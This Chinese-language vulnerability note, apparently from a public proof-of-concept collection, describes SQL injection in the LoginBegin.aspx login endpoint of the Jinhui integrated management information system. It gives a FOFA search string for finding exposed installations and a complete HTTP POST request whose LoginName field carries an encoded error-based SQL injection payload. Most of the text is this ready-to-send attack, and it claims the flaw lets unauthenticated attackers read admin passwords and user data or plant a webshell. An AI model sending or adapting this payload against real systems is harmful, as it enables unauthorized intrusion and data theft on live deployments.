# 金慧综合管理信息系统LoginBegin.aspx存在SQL注入漏洞

由于金慧-综合管理信息系统 LoginBegin.aspx（登录接口处）没有对外部输入的SQL语句进行严格的校验和过滤，直接带入数据库执行，导致未经身份验证的远程攻击者可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

## fofa

```yaml
body="/Portal/LoginBegin.aspx"
```

## poc

```yaml
POST /Portal/LoginBegin.aspx?ReturnUrl=%2f HTTP/1.1
Host: 
Accept-Encoding: gzip, deflate
Accept: */*
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
 
Todo=Validate&LoginName=1%27+AND+5094+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%2898%29%2BCHAR%28112%29%2BCHAR%28120%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%285094%3D5094%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29+AND+%27JKJg%27%3D%27JKJg&Password=&CDomain=Local&FromUrl=
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407261053940.png)